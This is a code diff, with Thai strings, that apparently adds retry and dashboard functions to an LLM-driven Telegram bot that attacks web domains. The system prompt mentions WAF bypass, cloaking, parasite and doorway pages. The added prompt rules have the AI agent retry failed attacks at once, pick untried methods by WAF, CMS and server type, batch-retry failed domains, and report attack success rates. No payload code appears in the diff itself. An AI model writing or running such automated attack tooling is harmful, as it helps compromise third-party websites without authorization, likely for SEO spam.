@@ -832,6 +832,62 @@ const AI_TOOLS: Tool[] = [
       },
     },
   },
+  // ─── Retry Tools ───
+  {
+    type: "function" as const,
+    function: {
+      name: "retry_attack",
+      description: "Retry โจมตี domain ที่เคยล้มเหลว — ระบบจะเลือกวิธีที่ยังไม่เคยลองอัตโนมัติ หรือระบุวิธีเอง",
+      parameters: {
+        type: "object",
+        properties: {
+          domain: { type: "string", description: "โดเมนที่ต้องการ retry" },
+          method: { type: "string", description: "วิธีที่ต้องการใช้ (optional — ถ้าไม่ระบุจะเลือกอัตโนมัติ)" },
+        },
+        required: ["domain"],
+      },
+    },
+  },
+  {
+    type: "function" as const,
+    function: {
+      name: "retry_all_failed",
+      description: "Retry ทุก domain ที่ล้มเหลวอัตโนมัติ — ระบบจะเลือกวิธีที่เหมาะสมสำหรับแต่ละ domain",
+      parameters: {
+        type: "object",
+        properties: {
+          max_retries: { type: "number", description: "จำนวน domain สูงสุดที่จะ retry (default: 20)" },
+        },
+        required: [],
+      },
+    },
+  },
+  {
+    type: "function" as const,
+    function: {
+      name: "view_retry_stats",
+      description: "ดูสถิติ retry — จำนวน domain ที่ล้มเหลว, ที่ retry ได้, ที่หมดวิธีแล้ว, ผลลัพธ์ล่าสุด",
+      parameters: {
+        type: "object",
+        properties: {},
+        required: [],
+      },
+    },
+  },
+  {
+    type: "function" as const,
+    function: {
+      name: "view_dashboard_summary",
+      description: "ดูสรุป Attack Dashboard — สถิติโจมตี, success rate, top methods, failed domains, deployment history",
+      parameters: {
+        type: "object",
+        properties: {
+          period: { type: "string", enum: ["today", "week", "month", "all"], description: "ช่วงเวลา (default: week)" },
+        },
+        required: [],
+      },
+    },
+  },
 ];
 
 // ═══════════════════════════════════════════════════════
@@ -1457,6 +1513,107 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         return result;
       }
 
+      case "retry_attack": {
+        const { retryDomain, getRetryPlan } = await import("./auto-retry-engine");
+        const domain = args.domain;
+        
+        // Show plan first
+        const plan = await getRetryPlan(domain);
+        if (!plan && !args.method) {
+          return `❌ ${domain}: ไม่พบในรายการ failed domains หรือลองทุกวิธีแล้ว`;
+        }
+        
+        const result = await retryDomain(domain, args.method);
+        const duration = Date.now() - startTime;
+        
+        if (result.success) {
+          return `✅ Retry ${domain} สำเร็จ!\n` +
+            `วิธี: ${result.method}\n` +
+            `รายละเอียด: ${result.details || "-"}\n` +
+            `⏱ ${formatDuration(result.durationMs)}`;
+        } else {
+          return `❌ Retry ${domain} ล้มเหลว\n` +
+            `วิธี: ${result.method}\n` +
+            `สาเหตุ: ${result.error || "-"}\n` +
+            `⏱ ${formatDuration(result.durationMs)}`;
+        }
+      }
+
+      case "retry_all_failed": {
+        const { retryAllFailed } = await import("./auto-retry-engine");
+        const maxRetries = args.max_retries || 20;
+        
+        const batchResult = await retryAllFailed({ maxRetries });
+        const duration = Date.now() - startTime;
+        
+        let response = `🔄 Retry All เสร็จ!\n\n`;
+        response += `ทั้งหมด: ${batchResult.totalDomains} domains\n`;
+        response += `Retry: ${batchResult.retried} | สำเร็จ: ${batchResult.succeeded} | ล้มเหลว: ${batchResult.failed}\n`;
+        response += `ข้าม: ${batchResult.skipped} (หมดวิธีแล้ว)\n`;
+        response += `⏱ ${formatDuration(batchResult.totalDurationMs)}\n\n`;
+        
+        // Show results
+        if (batchResult.results.length > 0) {
+          response += `ผลลัพธ์:\n`;
+          for (const r of batchResult.results.slice(0, 10)) {
+            response += `${r.success ? "✅" : "❌"} ${r.domain} (${r.method}) ${r.success ? r.details || "" : r.error || ""}\n`;
+          }
+          if (batchResult.results.length > 10) {
+            response += `... +${batchResult.results.length - 10} more`;
+          }
+        }
+        
+        return response;
+      }
+
+      case "view_retry_stats": {
+        const { getRetryStats } = await import("./auto-retry-engine");
+        const stats = await getRetryStats();
+        const duration = Date.now() - startTime;
+        
+        let response = `🔄 Retry Stats\n\n`;
+        response += `ล้มเหลวทั้งหมด: ${stats.totalFailed} domains\n`;
+        response += `Retry ได้: ${stats.retriable} domains\n`;
+        response += `หมดวิธีแล้ว: ${stats.exhausted} domains\n\n`;
+        
+        if (stats.recentRetries.length > 0) {
+          response += `Retry ล่าสุด:\n`;
+          for (const r of stats.recentRetries.slice(0, 10)) {
+            response += `${r.success ? "✅" : "❌"} ${r.domain} (${r.method})\n`;
+          }
+        }
+        
+        response += `\n⏱ ${formatDuration(duration)}`;
+        return response;
+      }
+
+      case "view_dashboard_summary": {
+        const { getAttackStats } = await import("./db");
+        const stats = await getAttackStats();
+        const { getRetryStats } = await import("./auto-retry-engine");
+        const retryStats = await getRetryStats();
+        const duration = Date.now() - startTime;
+        
+        let response = `📊 Attack Dashboard\n\n`;
+        response += `สถิติโจมตี:\n`;
+        response += `  สำเร็จ: ${stats.totalSuccess} | ล้มเหลว: ${stats.totalAttempts - stats.totalSuccess}\n`;
+        response += `  Success Rate: ${stats.successRate}%\n`;
+        
+        if (stats.topMethods.length > 0) {
+          response += `\nวิธีที่ได้ผล:\n`;
+          for (const m of stats.topMethods.slice(0, 5)) {
+            response += `  • ${m.method}: ${m.count} ครั้ง\n`;
+          }
+        }
+        
+        response += `\nRetry Queue:\n`;
+        response += `  ล้มเหลว: ${retryStats.totalFailed} | Retry ได้: ${retryStats.retriable} | หมดวิธี: ${retryStats.exhausted}\n`;
+        
+        response += `\nดูเพิ่มเติมที่หน้าเว็บ: /attack-dashboard`;
+        response += `\n⏱ ${formatDuration(duration)}`;
+        return response;
+      }
+
       default:
         return `Unknown tool: ${name}`;
     }
@@ -1492,6 +1649,9 @@ function buildSystemPrompt(context: SystemContext): string {
 - "สถานะ" / "ตอนนี้เป็นไง" / "อัพเดท" → ถามสถานะรวม ให้ตอบจาก context
 - "advanced" / "เทคนิคขั้นสูง" / "parasite" / "cloaking" / "play store" / "doorway" / "APK" → เรียก advanced_attack
 - "deploy" / "วาง" / "อัพ" / "auto deploy" / "วางแล้ว deploy" → เรียก deploy_advanced (สร้าง + deploy อัตโนมัติ)
+- "retry" / "ลองใหม่" / "ลองอีก" → เรียก retry_attack (ถ้ามี domain) หรือ retry_all_failed (ถ้าพิมพ์ "retry all" / "ลองใหม่ทั้งหมด")
+- "dashboard" / "สรุป" / "สถิติโจมตี" / "stats" → เรียก view_dashboard_summary
+- "retry stats" / "สถิติ retry" → เรียก view_retry_stats
 - "rank เท่าไหร่" / "อันดับ" → เช็ค keyword rank
 - "PBN" / "เว็บเครือข่าย" → เช็ค PBN status
 - "log" / "ดู log" / "ประวัติการโจมตี" / "เคยโจมตียังไง" / "ทำไมล้มเหลว" → ดู attack logs ให้เรียก check_attack_logs
@@ -1544,6 +1704,15 @@ function buildSystemPrompt(context: SystemContext): string {
 - ถ้ามี WAF → แนะนำ agentic_auto เป็นอันดับ 1 (มี WAF bypass อัตโนมัติ)
 - ถ้าโดน 403 → แนะนำ agentic_auto ที่จะลองหลายวิธี bypass
 - ถ้า timeout → แนะนำลองใหม่ทีหลัง หรือ scan_only ก่อนเพื่อดูข้อมูลเพิ่มเติม
+
+═══ Auto-Retry และ Dashboard ═══
+เมื่อ user พิมพ์ "retry xxx.com" หรือ "ลองใหม่ xxx.com" → เรียก retry_attack ทันที
+เมื่อ user พิมพ์ "retry all" หรือ "ลองใหม่ทั้งหมด" → เรียก retry_all_failed
+เมื่อ user พิมพ์ "สถิติ retry" หรือ "retry stats" → เรียก view_retry_stats
+เมื่อ user พิมพ์ "dashboard" หรือ "สรุป" หรือ "สถิติโจมตี" → เรียก view_dashboard_summary
+
+retry_attack จะเลือกวิธีที่ยังไม่เคยลองอัตโนมัติ โดยวิเคราะห์ failure context (WAF, CMS, server type) เพื่อเลือกวิธีที่มีโอกาสสำเร็จสูงสุด
+retry_all_failed จะ retry ทุก domain ที่ล้มเหลว โดยเลือกวิธีที่เหมาะสมสำหรับแต่ละ domain
 
 ═══ การเข้าใจ follow-up ═══
 - ถ้า user พิมพ์ตัวเลข ("1", "2", "3", "4") หรือ "ข้อ X" → ดูจากบริบทก่อนหน้าว่ากำลังคุยเรื่องอะไร
@@ -2950,6 +3119,59 @@ async function handleCallbackQuery(cbq: NonNullable<TelegramUpdate["callback_que
             await sendAlternativeAttackSuggestions(config, chatId, domain, `advanced_${technique}`, {
               errorMessage: err.message,
             });
+          }
+          return;
+        }
+
+        // retry_domain:<domain> — retry a specific domain
+        if (data.startsWith("retry_domain:")) {
+          const domain = data.replace("retry_domain:", "");
+          await sendTelegramReply(config, chatId, `🔄 Retry ${domain}...`);
+          
+          try {
+            const { retryDomain } = await import("./auto-retry-engine");
+            const result = await retryDomain(domain);
+            
+            if (result.success) {
+              await sendTelegramReply(config, chatId,
+                `✅ Retry ${domain} สำเร็จ!\nวิธี: ${result.method}\n${result.details || ""}\n⏱ ${formatDuration(result.durationMs)}`);
+            } else {
+              await sendTelegramReply(config, chatId,
+                `❌ Retry ${domain} ล้มเหลว\nวิธี: ${result.method}\n${result.error || ""}\n⏱ ${formatDuration(result.durationMs)}`);
+              // Suggest alternatives
+              await sendAlternativeAttackSuggestions(config, chatId, domain, result.method, {
+                errorMessage: result.error || undefined,
+              });
+            }
+          } catch (err: any) {
+            await sendTelegramReply(config, chatId, `❌ Retry ล้มเหลว: ${err.message}`);
+          }
+          return;
+        }
+
+        // retry_all — retry all failed domains
+        if (data === "retry_all") {
+          await sendTelegramReply(config, chatId, `🔄 กำลัง retry ทุก domain ที่ล้มเหลว...`);
+          
+          try {
+            const { retryAllFailed } = await import("./auto-retry-engine");
+            const batchResult = await retryAllFailed({
+              maxRetries: 20,
+              onProgress: async (current, total, result) => {
+                if (current % 5 === 0 || current === total) {
+                  await sendTelegramReply(config, chatId,
+                    `🔄 Retry ${current}/${total}: ${result.success ? "✅" : "❌"} ${result.domain} (${result.method})`);
+                }
+              },
+            });
+            
+            let summary = `🔄 Retry All เสร็จ!\n\n`;
+            summary += `ทั้งหมด: ${batchResult.totalDomains} | Retry: ${batchResult.retried}\n`;
+            summary += `✅ สำเร็จ: ${batchResult.succeeded} | ❌ ล้มเหลว: ${batchResult.failed}\n`;
+            summary += `⏱ ${formatDuration(batchResult.totalDurationMs)}`;
+            await sendTelegramReply(config, chatId, summary);
+          } catch (err: any) {
+            await sendTelegramReply(config, chatId, `❌ Retry All ล้มเหลว: ${err.message}`);
           }
           return;
         }
